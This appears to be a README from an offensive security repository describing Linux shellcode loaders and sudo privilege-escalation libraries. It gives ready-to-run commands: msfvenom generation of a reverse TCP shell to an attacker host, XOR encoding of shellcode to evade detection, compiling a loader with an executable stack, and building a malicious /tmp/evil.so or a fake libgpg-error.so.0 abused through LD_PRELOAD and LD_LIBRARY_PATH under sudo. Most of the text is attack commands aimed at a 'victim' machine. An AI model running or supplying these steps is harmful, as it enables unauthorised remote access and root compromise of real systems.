# linux loaders

Four files forming two separate use cases. The shellcode runner files are a chain; the shared library files are standalone.

---

## File Roles

| File | Chain or Standalone? | Role | Runs on |
|------|---------------------|------|---------|
| `simpleXORencoder.c` | Chain — Step 1 (can skip) | Encode raw shellcode → print hex | Your Kali (prep tool) |
| `simpleLoader.c` | Chain — Step 2 | Runtime shellcode executor | Victim Linux machine |
| `sharedLibrary_LD_PRELOAD.c` | Standalone | Priv esc via LD_PRELOAD | Victim Linux machine |
| `sharedLibrary_LD_LIBRARY_PATH.c` | Standalone | Priv esc via LD_LIBRARY_PATH | Victim Linux machine |

---

## Chain 1: Shellcode Runner

```
simpleXORencoder.c          →       simpleLoader.c
(optional encoder tool)             (runtime payload)

XOR-encodes raw shellcode           Decodes buf[] at runtime
with key 0xfa, prints               and executes it
\xNN output to paste
into simpleLoader.c buf[]
```

You can skip `simpleXORencoder.c` and encode on Kali directly:
```bash
# Generate raw shellcode
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP> LPORT=443 -f raw -o shell.bin

# XOR encode with key 0xfa
python3 -c "
data = open('shell.bin','rb').read()
enc  = bytes(b ^ 0xfa for b in data)
print(''.join(f'\\\\x{b:02x}' for b in enc))
"
# Paste the \xNN output into buf[] in simpleLoader.c
```

**Compile and run simpleLoader.c:**
```bash
# -z execstack makes the stack executable so shellcode in buf[] can run
gcc -z execstack -o loader simpleLoader.c
./loader
```

---

## Standalone 1: sharedLibrary_LD_PRELOAD.c

**When to use:** `sudo -l` shows `env_keep+=LD_PRELOAD` (or any sudo entry that preserves LD_PRELOAD).

Compiles as a `.so` that hooks `geteuid()`. When any program calls `geteuid()`, a fork happens: the child runs your shellcode; the parent returns the real `geteuid()` value so the target program continues normally.

```bash
# 1. Paste your shellcode into buf[] in sharedLibrary_LD_PRELOAD.c

# 2. Compile as shared library (-fPIC = position-independent, -shared = .so output)
gcc -fPIC -shared -nostartfiles -o /tmp/evil.so sharedLibrary_LD_PRELOAD.c

# 3. Run with LD_PRELOAD via any allowed sudo command
sudo LD_PRELOAD=/tmp/evil.so <ANY_WHITELISTED_SUDO_COMMAND>
# → shellcode fires when the sudo'd command calls geteuid()
```

---

## Standalone 2: sharedLibrary_LD_LIBRARY_PATH.c

**When to use:** `sudo` preserves `LD_LIBRARY_PATH` AND you can identify a library the target binary loads (via `ldd`).

Compiles as a `.so` that masquerades as a real shared library. Uses a GCC constructor so `runmahpayload()` fires **automatically when the library loads** — before any other code runs. Also attempts `setuid(0)/setgid(0)`.

```bash
# 1. Find which library to impersonate
ldd $(which <SUDO_ALLOWED_PROGRAM>)
# Pick a library from the list, e.g. libgpg-error.so.0

# 2. Paste shellcode into buf[] in sharedLibrary_LD_LIBRARY_PATH.c

# 3. Compile with the exact library name
gcc -fPIC -shared -nostartfiles -o /tmp/libgpg-error.so.0 sharedLibrary_LD_LIBRARY_PATH.c

# 4. Run with LD_LIBRARY_PATH pointing to /tmp
sudo LD_LIBRARY_PATH=/tmp <WHITELISTED_SUDO_COMMAND>
# → payload fires immediately when the binary loads the fake library
```

---

## Notes

- Both shared library techniques require a `sudo` rule that preserves the relevant environment variable — verify with `sudo -l` first.
- The shellcode XOR key in `simpleLoader.c` and `simpleXORencoder.c` is `0xfa`. Use the same key in both.
- For the shared library files, the shellcode XOR key may differ — check the `buf[]` decode loop in each file.
- Same 4 files exist at `08-linux/loaders/` — they are identical copies.
